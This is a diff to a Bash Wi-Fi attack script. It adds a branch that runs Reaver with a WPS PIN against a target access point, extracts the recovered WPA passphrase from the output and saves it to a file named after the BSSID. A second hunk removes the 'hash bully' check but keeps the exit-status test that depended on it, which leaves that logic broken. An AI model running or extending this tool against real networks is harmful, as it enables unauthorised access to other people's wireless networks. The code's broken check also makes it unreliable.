@@ -1635,6 +1635,18 @@ CRACKING_PROCESS() {
 										                             echo ""
 										                             echo -e "$White [+] Running$Green Reaver$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
+											                         echo -e -n "$BYellow"
+										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4 | tee  ${Temporary}/Get_PIN.txt
+										                             PID="$!"
+										                             Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
+										                             End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
+										                             Loading
+										                             Key=`grep -w "WPA PSK" ${Temporary}/Get_PIN.txt | awk -F\' '{print $2}'`
+													                 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+																 else
+																     echo ""				                           
+										                             echo -e "$White [+] Running$Green Reaver$White with the correct$Green PIN$White, wait ..."
+											                         echo ""
 										                             echo -e -n "$BYellow"
 										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4 | tee  ${Temporary}/Get_PIN.txt
 										                             PID="$!"
@@ -2519,7 +2531,7 @@ case $menu in
 						   echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
 						   read CHANNEL
 						   echo ""
-						   hash bully
+						 
 						   hash_bully="$?"
 						   if [ $hash_bully -eq 0 ]
 								then
